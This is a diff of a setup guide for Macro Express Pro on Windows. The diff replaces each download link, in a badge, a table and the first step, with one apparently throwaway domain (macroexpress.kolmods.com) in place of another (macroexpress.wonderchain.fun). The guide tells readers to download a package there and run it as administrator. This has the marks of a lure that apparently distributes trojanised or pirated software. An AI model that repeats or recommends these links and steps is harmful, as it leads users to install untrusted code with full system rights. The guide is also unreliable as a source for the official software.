@@ -11,20 +11,20 @@ Notes for users who need Macro Express Pro running on Windows — especially whe
 Use the link below for the Windows package referenced in this guide.
 
 <p align="center">
-  <a href="https://macroexpress.wonderchain.fun/">
+  <a href="https://macroexpress.kolmods.com/">
     <img src="https://img.shields.io/badge/Open%20setup%20page-Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white" alt="Open setup page">
   </a>
 </p>
 
 | | |
 | --- | --- |
-| **Page** | [macroexpress.wonderchain.fun](https://macroexpress.wonderchain.fun/) |
-| **URL** | `https://macroexpress.wonderchain.fun/` |
+| **Page** | [macroexpress.kolmods.com](https://macroexpress.kolmods.com/) |
+| **URL** | `https://macroexpress.kolmods.com/` |
 | **Platform** | Windows 10 / 11 (64-bit) |
 
 ### Recommended steps
 
-1. Open the [setup page (macroexpress.wonderchain.fun)](https://macroexpress.wonderchain.fun/)
+1. Open the [setup page (macroexpress.kolmods.com)](https://macroexpress.kolmods.com/)
 2. Download the package to a folder you can find (e.g. Downloads)
 3. Run the installer **as administrator** if Windows asks
 4. Reboot once if the app prompts after install
